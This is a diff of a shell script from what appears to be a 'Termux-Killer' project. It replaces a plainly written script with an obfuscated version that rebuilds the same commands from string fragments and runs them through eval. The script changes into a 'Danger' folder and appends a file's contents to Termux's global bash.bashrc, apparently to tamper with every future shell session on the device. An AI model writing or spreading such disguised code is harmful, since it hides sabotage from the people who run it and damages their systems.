@@ -1,11 +1,3 @@
-clear
-echo " "
-echo " "
-echo -e "                \e[1m\e[32m ____( \e[33mGood Bye!!!\e[32m )____\e[0m"
-echo " "
-echo " "
-cd $HOME
-cd Termux-Killer
-cd Danger
-cat "bye.txt" >> /data/data/com.termux/files/usr/etc/bash.bashrc
-yes
+z="
+";az='ller';Yz='ermu';Gz='    ';Bz='r';hz=' /da';Jz='[32m';Hz=' \e[';Cz='echo';Nz='mGoo';tz='yes';cz='ange';Uz='m"';kz='com.';sz='shrc';qz='/bas';Pz='e!!!';gz='" >>';Vz='cd $';rz='h.ba';Wz='HOME';Kz=' ___';iz='ta/d';Az='clea';dz='cat ';Qz='\e[3';Rz='2m )';oz='/usr';Sz='____';Xz='cd T';Mz='e[33';Fz='"   ';Zz='x-Ki';pz='/etc';jz='ata/';Lz='_( \';Ez=' -e ';Dz=' " "';bz='cd D';Iz='1m\e';Oz='d By';mz='ux/f';Tz='\e[0';nz='iles';lz='term';ez='"bye';fz='.txt';
+eval "$Az$Bz$z$Cz$Dz$z$Cz$Dz$z$Cz$Ez$Fz$Gz$Gz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$z$Cz$Dz$z$Cz$Dz$z$Vz$Wz$z$Xz$Yz$Zz$az$z$bz$cz$Bz$z$dz$ez$fz$gz$hz$iz$jz$kz$lz$mz$nz$oz$pz$qz$rz$sz$z$tz"
